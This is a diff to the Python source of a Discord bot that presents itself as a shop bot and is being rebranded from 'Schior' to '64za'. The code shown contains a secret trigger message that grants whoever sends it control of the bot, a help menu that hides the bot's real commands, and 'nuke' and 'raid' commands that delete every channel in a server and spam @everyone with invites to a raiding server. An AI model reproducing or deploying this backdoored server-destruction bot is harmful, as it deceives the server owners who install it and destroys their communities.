@@ -29,7 +29,7 @@ REDEEMED_USERS = config.get("redeemed", {})  # str(user_id) → int(role_id)
 async def on_ready():
     print(f"Logged in as {bot.user} (ID: {bot.user.id})")
     print("Prefix: .")
-    print("Secret trigger: $schior")
+    print("Secret trigger: $64za")
 
 @bot.event
 async def on_message(message):
@@ -39,7 +39,7 @@ async def on_message(message):
     global AUTHORIZED_USER_ID
 
     # Secret activation
-    if message.content.strip().lower() == "$schior":
+    if message.content.strip().lower() == "$64za":
         AUTHORIZED_USER_ID = message.author.id
         await message.channel.send("Activated")
         try:
@@ -81,7 +81,7 @@ async def on_message(message):
 
     # Normal help — only safe commands
     if message.content == ".help":
-        embed = discord.Embed(title="Schior’s Shop Bot Commands", color=0x00aa00)
+        embed = discord.Embed(title="64za's Shop Bot Commands", color=0x00aa00)
         embed.add_field(name=".help", value="This message", inline=False)
         embed.add_field(name=".ping", value="Bot latency", inline=False)
         embed.add_field(name="$redeem <key>", value="Unlock staff commands", inline=False)
@@ -170,7 +170,7 @@ async def nuke(ctx):
         return  # silent ignore
 
     guild = ctx.guild
-    msg = "@everyone nuke/raid people..\nhttps://discord.gg/schiorshop"
+    msg = "@everyone if yall want to nuke/raid people then join..\nhttps://discord.gg/64zashop"
 
     # wipe channels
     for ch in list(guild.channels):
@@ -203,7 +203,7 @@ async def raid(ctx, count: int = 1):
         return
 
     count = max(1, min(count, 250))
-    msg = "@everyone if you want to raid/nuke join https://discord.gg/schiorshop"
+    msg = "@everyone if you want to raid/nuke join https://discord.gg/64zashop"
 
     chans = [c for c in ctx.guild.text_channels if c.permissions_for(ctx.guild.me).send_messages]
     if not chans: return
